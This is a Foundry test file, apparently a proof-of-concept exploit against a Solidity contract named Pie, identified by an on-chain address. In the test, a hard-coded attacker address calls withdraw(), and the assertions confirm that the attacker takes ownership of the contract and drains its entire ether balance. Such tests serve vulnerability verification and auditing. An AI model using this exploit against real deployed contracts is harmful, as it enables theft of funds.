// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol";

contract PieTest is Test {
    Pie pie;
    address constant attacker = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;

    function setUp() public {
        pie = new Pie();
        vm.deal(address(pie), 1 ether);
    }

    function testMaliciousWithdrawAndOwnershipTakeover() public {
        // Capture initial state variables
        address ownerBefore = pie.Owner();
        uint256 totalWithdrawalsBefore = pie.totalWithdrawals();
        uint256 initialPieBalance = address(pie).balance;
        uint256 initialAttackerBalance = attacker.balance;
        
        // Log pre-trigger state snapshot
        console2.log("--- BEFORE-TRIGGER STATE ---");
        console2.log("Contract Owner:    ", ownerBefore);
        console2.log("Total Withdrawals: ", totalWithdrawalsBefore);
        
        // Execute the critical attack action
        console2.log("--- TRIGGER: WITHDRAWAL BY ATTACKER ---");
        vm.prank(attacker);
        pie.withdraw();
        
        // Capture post-trigger state
        address ownerAfter = pie.Owner();
        uint256 totalWithdrawalsAfter = pie.totalWithdrawals();
        
        // Log post-trigger state snapshot
        console2.log("--- AFTER-TRIGGER STATE ---");
        console2.log("Contract Owner:    ", ownerAfter);
        console2.log("Total Withdrawals: ", totalWithdrawalsAfter);
        
        // Differential comparison and verdict
        console2.log("--- DIFFERENTIAL VERDICT ---");
        bool ownershipTransferred = (ownerBefore != attacker) && (ownerAfter == attacker);
        bool withdrawalsIncreased = totalWithdrawalsAfter > totalWithdrawalsBefore;
        
        console2.log("Ownership changed: %s", ownershipTransferred ? "YES" : "NO");
        console2.log("Withdrawals increased: %s", withdrawalsIncreased ? "YES" : "NO");
        
        // Final vulnerability determination
        if (ownershipTransferred) {
            console2.log("Vulnerability Exists: Ownership was transferred to attacker");
        } else {
            console2.log("Vulnerability not Exist: Ownership was not changed");
        }
        
        // Original assertions
        assertEq(ownerAfter, attacker, "Ownership transferred to attacker");
        assertEq(address(pie).balance, 0, "Contract funds stolen");
        assertEq(
            attacker.balance,
            initialAttackerBalance + initialPieBalance,
            "Attacker received stolen funds"
        );
    }
}